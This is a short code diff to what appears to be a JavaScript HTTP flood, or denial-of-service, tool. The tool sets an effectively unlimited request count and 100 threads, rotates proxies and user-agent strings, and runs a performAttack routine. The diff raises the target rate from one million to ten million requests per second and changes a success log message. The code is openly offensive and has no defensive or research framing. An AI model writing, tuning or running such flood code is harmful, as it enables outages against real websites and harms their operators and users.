@@ -71,7 +71,7 @@ const acceptHeaders = [
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 1000000;
+const requestsPerSecond = 10000000;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
@@ -146,7 +146,7 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
     })
     .then((response) => {
         if (response.status === 200) {
-            console.log(rainbow(`PING SUCCESS! ${response.status}`));
+            console.log(rainbow(`PING! Success ✓ (${response.status})`));
         }
         requestsSent++;
         checkCompletion(requestsSent);
